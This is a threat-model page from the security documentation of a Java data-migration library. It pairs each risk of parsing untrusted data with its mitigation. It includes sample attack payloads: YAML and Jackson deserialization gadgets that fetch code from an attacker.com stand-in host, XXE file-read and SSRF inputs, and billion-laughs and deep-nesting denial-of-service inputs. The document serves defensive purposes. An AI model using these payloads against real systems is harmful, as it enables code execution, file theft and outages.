# Threat Model

This document describes the threat model for Aether Datafixers when processing untrusted data. Understanding these threats helps you make informed decisions about security controls.

## Overview

Aether Datafixers processes serialized data (JSON, YAML, XML, TOML) and applies migrations to transform it between schema versions. When this data comes from untrusted sources, attackers may craft malicious payloads to exploit vulnerabilities in the parsing or processing pipeline.

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────┐
│                        UNTRUSTED ZONE                           │
│                                                                 │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐     │
│  │  User    │  │ External │  │ Message  │  │   Database   │     │
│  │ Uploads  │  │   APIs   │  │  Queues  │  │    Blobs     │     │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘  └──────┬───────┘     │
│       │             │             │               │             │
└───────┼─────────────┼─────────────┼───────────────┼─────────────┘
        │             │             │               │
        ▼             ▼             ▼               ▼
╔═══════════════════════════════════════════════════════════════╗
║                      TRUST BOUNDARY                           ║
║  ┌─────────────────────────────────────────────────────────┐  ║
║  │                 INPUT VALIDATION                        │  ║
║  │  • Size limits     • Depth limits    • Format validation│  ║
║  └─────────────────────────────────────────────────────────┘  ║
╚═══════════════════════════════════════════════════════════════╝
                             │
                             ▼
┌─────────────────────────────────────────────────────────────────┐
│                        TRUSTED ZONE                             │
│                                                                 │
│  ┌───────────────┐    ┌────────────────┐    ┌───────────────┐   │
│  │ DynamicOps    │───▶│  DataFixer     │───▶│  Application  │   │
│  │ (Parsing)     │    │  (Migration)   │    │  Logic        │   │
│  └───────────────┘    └────────────────┘    └───────────────┘   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### Untrusted Data Sources

| Source             | Examples                               | Trust Level                                       |
|--------------------|----------------------------------------|---------------------------------------------------|
| User Uploads       | Game saves, config imports, data files | **Untrusted**                                     |
| External APIs      | Third-party integrations, webhooks     | **Untrusted**                                     |
| Message Queues     | Kafka topics, RabbitMQ queues          | **Untrusted** (unless internal)                   |
| Database Blobs     | Serialized objects in DB columns       | **Semi-trusted** (may contain legacy unsafe data) |
| Internal Services  | Same-cluster microservices             | **Trusted** (if properly authenticated)           |
| Local Config Files | Application configuration              | **Trusted** (deployed by operators)               |

## Attack Vectors

### 1. Arbitrary Code Execution (RCE)

**Severity:** Critical
**Affected:** SnakeYAML (default constructor)

SnakeYAML's default constructor can instantiate arbitrary Java classes, allowing attackers to execute code by crafting malicious YAML:

```yaml
# Malicious YAML that attempts to execute code
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.com/malicious.jar"]
  ]]
]
```

**Impact:** Complete system compromise, data theft, lateral movement.

**Mitigation:** Always use `SafeConstructor` for untrusted YAML. See [SnakeYAML Security](format-considerations/snakeyaml.md).

---

### 2. Billion Laughs Attack (Entity Expansion)

**Severity:** High
**Affected:** YAML (aliases), XML (entities)

Exponential expansion of aliases or entities can consume all available memory:

```yaml
# YAML Billion Laughs
a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]
e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]
f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]
# Expands to billions of elements
```

```xml
<!-- XML Billion Laughs -->
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... continues exponentially ... -->
]>
<lolz>&lol9;</lolz>
```

**Impact:** Denial of Service through memory exhaustion, application crash.

**Mitigation:**
- YAML: Set `maxAliasesForCollections` in `LoaderOptions`
- XML: Disable DTD processing or limit entity expansion

---

### 3. XXE (XML External Entity) Injection

**Severity:** High
**Affected:** XML

External entity references can read local files or make server-side requests:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
```

```xml
<!-- SSRF variant -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server/admin/secret">
]>
<data>&xxe;</data>
```

**Impact:**
- **Confidentiality:** Read sensitive files (credentials, configs)
- **SSRF:** Access internal services, cloud metadata endpoints
- **DoS:** Reference slow or infinite resources

**Mitigation:** Disable external entity processing and DTDs. See [Jackson XML Security](format-considerations/jackson.md#xxe-prevention).

---

### 4. Polymorphic Deserialization Attacks

**Severity:** Medium-High
**Affected:** Jackson (with default typing enabled)

When Jackson's default typing is enabled, attackers can specify arbitrary classes for deserialization:

```json
{
  "@class": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com/exploit",
  "autoCommit": true
}
```

**Impact:** Remote code execution through gadget chains.

**Mitigation:** Never enable default typing for untrusted data. If polymorphic deserialization is required, use allowlist-based `PolymorphicTypeValidator`. See [Jackson Security](format-considerations/jackson.md).

---

### 5. Resource Exhaustion (DoS)

**Severity:** Medium
**Affected:** All formats

Large payloads or deeply nested structures can exhaust memory or CPU:

```json
{
  "a": {
    "b": {
      "c": {
        // ... nested 10,000 levels deep
      }
    }
  }
}
```

**Impact:** Denial of Service, application unresponsiveness.

**Mitigation:**
- Validate input size before parsing
- Configure nesting depth limits
- Set string length limits
- Implement timeouts

---

### 6. Stack Overflow

**Severity:** Medium
**Affected:** All formats (recursive parsing)

Deeply nested structures can cause stack overflow during parsing or migration:

```json
[[[[[[[[[[[[[[[[[[[[[[...]]]]]]]]]]]]]]]]]]]]]]
```

**Impact:** Application crash, potential DoS.

**Mitigation:** Configure nesting depth limits in parser settings.

---

## Impact Assessment

| Attack                      | Confidentiality | Integrity | Availability |
|-----------------------------|-----------------|-----------|--------------|
| RCE (SnakeYAML)             | High            | High      | High         |
| Billion Laughs              | Low             | Low       | **High**     |
| XXE                         | **High**        | Low       | Medium       |
| Polymorphic Deserialization | High            | High      | High         |
| Resource Exhaustion         | Low             | Low       | **High**     |
| Stack Overflow              | Low             | Low       | High         |

## Attack Scenarios

### Scenario 1: Game Save Import

A gaming platform allows users to import save files in YAML format.

**Attack:** User uploads a YAML file with malicious constructor tags.
**Impact:** RCE on the game server, access to other users' data.
**Defense:** Use `SafeConstructor`, validate file size, sandbox processing.

### Scenario 2: Configuration API

A microservice accepts JSON configuration updates via REST API.

**Attack:** Attacker sends deeply nested JSON to exhaust memory.
**Impact:** Service becomes unresponsive, affecting all users.
**Defense:** Size limits, depth limits, rate limiting.

### Scenario 3: Legacy Data Migration

An application migrates XML data stored in database blobs.

**Attack:** Legacy data contains XXE payloads (intentional or from old vulnerabilities).
**Impact:** Data exfiltration during migration process.
**Defense:** Disable external entities, validate before migration.

### Scenario 4: Webhook Processing

A service processes webhook payloads from third-party integrations.

**Attack:** Malicious webhook sends payload with polymorphic type hints.
**Impact:** RCE through deserialization gadgets.
**Defense:** Never enable default typing, validate webhook signatures.

## Security Checklist

Before processing untrusted data, verify:

- [ ] Input size is validated before parsing
- [ ] Parser is configured with depth/nesting limits
- [ ] Format-specific protections are enabled:
  - [ ] YAML: Using `SafeConstructor` with alias limits
  - [ ] XML: External entities and DTDs disabled
  - [ ] Jackson: Default typing is NOT enabled
- [ ] Timeouts are configured for migration operations
- [ ] Errors are logged without exposing sensitive information
- [ ] Rate limiting is applied for user-submitted data

## Related

- [Best Practices](best-practices.md)
- [Format-Specific Security](format-considerations/index.md)
- [Secure Configuration Examples](secure-configuration-examples.md)
